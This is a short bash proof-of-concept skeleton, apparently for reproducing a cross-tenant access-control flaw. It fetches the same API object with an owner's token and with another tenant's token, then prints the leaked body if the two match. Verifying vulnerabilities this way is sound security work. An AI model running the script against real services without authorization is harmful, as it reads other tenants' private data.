#!/usr/bin/env bash
# Reproduction skeleton. Fill the TODOs. Run from a clean shell.
set -euo pipefail

T="${TARGET:?set TARGET}"
A="${TOKEN_A:?set TOKEN_A}"
B="${TOKEN_B:?set TOKEN_B}"

echo "[1] baseline as owner"
curl -sS -o /tmp/v1 -w '%{http_code}\n' "$T/TODO/1" -H "Authorization: Bearer $A"

echo "[2] same object as other tenant"
curl -sS -o /tmp/v2 -w '%{http_code}\n' "$T/TODO/1" -H "Authorization: Bearer $B"

echo "[3] proof"
if cmp -s /tmp/v1 /tmp/v2; then echo "IDENTICAL BODY — cross-tenant read"; head -c 400 /tmp/v2; else echo "different bodies — check"; fi
